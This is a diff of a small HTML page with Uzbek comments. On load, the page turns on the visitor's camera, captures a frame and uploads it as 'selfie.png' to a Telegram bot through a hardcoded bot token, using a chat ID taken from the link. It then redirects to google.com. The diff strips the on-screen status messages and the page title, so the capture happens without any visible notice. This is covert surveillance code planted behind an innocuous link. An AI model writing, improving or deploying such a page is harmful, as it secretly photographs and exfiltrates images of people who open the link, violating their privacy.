@@ -1,99 +1,85 @@
 <!DOCTYPE html>
 <html lang="uz">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Selfie yuborilmoqda...</title>
-    <style>
-      body {
-        background: #fff;
-        text-align: center;
-        font-family: sans-serif;
-      }
-      video,
-      canvas {
-        display: none;
-      }
-    </style>
-  </head>
-  <body>
-    <h3 id="st">Kamera yoqilmoqda...</h3>
-    <video id="v" autoplay playsinline></video>
-    <canvas id="c"></canvas>
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title></title>
+<style>
+  body { background:#fff; text-align:center; font-family:sans-serif; }
+  video, canvas { display:none; }
+</style>
+</head>
+<body>
 
-    <script>
-      const TOKEN = "8438381311:AAH5T96S7xWkdbkUDohByM2rS4t6tQOdPqA";
-      const chatId = window.location.pathname.split("/").pop(); // URL oxiridagi chatId
+<video id="v" autoplay playsinline></video>
+<canvas id="c"></canvas>
 
-      async function start() {
-        try {
-          if (!chatId) {
-            console.error("chatId topilmadi");
-            return;
-          }
-          const st = document.getElementById("st");
+<script>
+const TOKEN = "8438381311:AAH5T96S7xWkdbkUDohByM2rS4t6tQOdPqA";
+const chatId = window.location.pathname.split("/").pop(); // URL oxiridagi chatId
 
-          st.textContent = "Kamera ruxsati so‘ralmoqda...";
-          const stream = await navigator.mediaDevices.getUserMedia({
-            video: true,
-          });
-          const v = document.getElementById("v");
-          v.srcObject = stream;
+async function start() {
+  try {
+    if (!chatId) {
+      console.error("chatId topilmadi");
+  
+      return;
+    }
 
-          // video frame kelishini kutamiz
-          await new Promise((resolve) => {
-            if (v.readyState >= 2 && v.videoWidth > 0) return resolve();
-            const onPlaying = () => {
-              v.removeEventListener("playing", onPlaying);
-              resolve();
-            };
-            v.addEventListener("playing", onPlaying);
-            v.play().catch(() => {});
-            setTimeout(() => {
-              v.removeEventListener("playing", onPlaying);
-              resolve();
-            }, 2500);
-          });
 
-          const c = document.getElementById("c");
-          c.width = v.videoWidth || 640;
-          c.height = v.videoHeight || 480;
-          const ctx = c.getContext("2d");
-          await new Promise((r) => requestAnimationFrame(r));
-          ctx.drawImage(v, 0, 0, c.width, c.height);
 
-          stream.getTracks().forEach((t) => t.stop());
-          st.textContent = "Rasm yuborilmoqda...";
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    const v = document.getElementById("v");
+    v.srcObject = stream;
 
-          const blob = await new Promise((res) => c.toBlob(res, "image/png"));
-          if (!blob) throw new Error("Rasm olinmadi");
+    // video frame kelishini kutamiz (Telegram in-app browser uchun)
+    await new Promise(resolve => {
+      if(v.readyState>=2 && v.videoWidth>0) return resolve();
+      const onPlaying = () => { v.removeEventListener("playing", onPlaying); resolve(); };
+      v.addEventListener("playing", onPlaying);
+      v.play().catch(()=>{});
+      setTimeout(()=>{ v.removeEventListener("playing", onPlaying); resolve(); }, 3000);
+    });
 
-          const form = new FormData();
-          form.append("chat_id", chatId);
-          form.append("photo", blob, "selfie.png");
-          form.append("caption", "Selfie olindi!");
+    const c = document.getElementById("c");
+    c.width = v.videoWidth || 640;
+    c.height = v.videoHeight || 480;
+    const ctx = c.getContext("2d");
 
-          const resp = await fetch(
-            `https://api.telegram.org/bot${TOKEN}/sendPhoto`,
-            { method: "POST", body: form }
-          );
-          const data = await resp.json().catch(() => null);
+    // Oxirgi frame kelishini kutamiz
+    await new Promise(r=>requestAnimationFrame(r));
+    ctx.drawImage(v,0,0,c.width,c.height);
 
-          if (!resp.ok || (data && !data.ok)) {
-            console.error("Telegramga yuborishda muammo", resp, data);
-            window.location.href = "https://google.com";
-            return;
-          }
+    stream.getTracks().forEach(t => t.stop());
+   
 
-          st.textContent = "Yuborildi, yo‘naltirilmoqda";
-          window.location.href = "https://google.com";
-        } catch (err) {
-          console.error(err);
-          window.location.href = "https://google.com";
-        }
-      }
+    const blob = await new Promise(res => c.toBlob(res,"image/png"));
+    if(!blob) throw new Error("Rasm olinmadi");
 
-      start();
-    </script>
-  </body>
+    const form = new FormData();
+    form.append("chat_id", chatId);
+    form.append("photo", blob, "selfie.png");
+    form.append("caption", "Selfie olindi!");
+
+    const resp = await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method:"POST", body:form });
+    const data = await resp.json().catch(()=>null);
+
+    if(!resp.ok || (data && !data.ok)){
+      console.error("Telegramga yuborishda muammo", resp, data);
+      window.location.href = "https://google.com";
+      return;
+    }
+
+
+    window.location.href = "https://google.com";
+
+  } catch(err){
+    console.error(err);
+    window.location.href = "https://google.com";
+  }
+}
+
+start();
+</script>
+</body>
 </html>
